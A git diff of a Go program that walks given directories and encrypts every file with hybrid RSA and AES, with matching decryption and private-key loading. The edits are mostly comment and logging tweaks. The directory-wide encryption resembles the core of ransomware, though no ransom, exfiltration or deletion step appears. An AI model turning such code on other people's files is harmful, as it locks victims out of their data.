@@ -28,8 +28,10 @@ var (
 
 func main() {
 	logger = log.NewWithOptions(os.Stdout, log.Options{
-		ReportCaller:    true, // Include caller info in logs
-		ReportTimestamp: true, // Include timestamps
+		// Include caller info in logs
+		ReportCaller: true,
+		// Include timestamps in logs
+		ReportTimestamp: true,
 	})
 	logger.SetPrefix("[Main]")
 
@@ -98,7 +100,7 @@ func Encrypt(valid_dirs []string) {
 			}
 
 			// Collect all files first
-			filepath.WalkDir(path, func(path string, d os.DirEntry, err error) error {
+			err = filepath.WalkDir(path, func(path string, d os.DirEntry, err error) error {
 				if err != nil {
 					return err
 				}
@@ -111,7 +113,7 @@ func Encrypt(valid_dirs []string) {
 				return nil
 			})
 			if err != nil {
-				logger.Errorf("Error while looking for files to encrypt: %v", err)
+				logger.Errorf("Error while walking dir: %v", err)
 			}
 			return nil
 		})
@@ -129,6 +131,7 @@ func Encrypt(valid_dirs []string) {
 }
 
 // Hybrid encryption: RSA + AES
+// This is an improvement over my original method of using just AES.
 func EncryptFileAsymmetric(path string, publicKey *rsa.PublicKey) error {
 	// Read the file
 	plaintext, err := os.ReadFile(path)
@@ -359,7 +362,7 @@ func DecryptFileAsymmetric(encPath string, privateKey *rsa.PrivateKey) ([]byte, 
 	plaintext := make([]byte, len(ciphertext))
 	mode.CryptBlocks(plaintext, ciphertext)
 
-	// 6. Unpad
+	// Unpad
 	plaintext, err = Unpad(plaintext)
 	if err != nil {
 		return nil, err
@@ -412,11 +415,8 @@ func ParsePublicKeyFromPEM(pemStr string) (*rsa.PublicKey, error) {
 // Load private key from current directory
 // Looks for common private key filenames
 func loadPrivateKeyFromCurrentDir() (*rsa.PrivateKey, error) {
-	// Common private key filenames to check
 	possibleFiles := []string{
 		"private.pem",
-		"privkey.pem",
-		"id_rsa",
 		"private_key.pem",
 	}
 
@@ -448,7 +448,7 @@ func loadPrivateKeyFromFile(path string) (*rsa.PrivateKey, error) {
 
 	privateKey, err := x509.ParsePKCS1PrivateKey(block.Bytes)
 	if err != nil {
-		// Try PKCS8 format
+		// Try PKCS8 format (this is redundant, but I wanted to keep it here just in case I changed the key format)
 		key, err2 := x509.ParsePKCS8PrivateKey(block.Bytes)
 		if err2 != nil {
 			return nil, fmt.Errorf("failed to parse private key: %v", err)
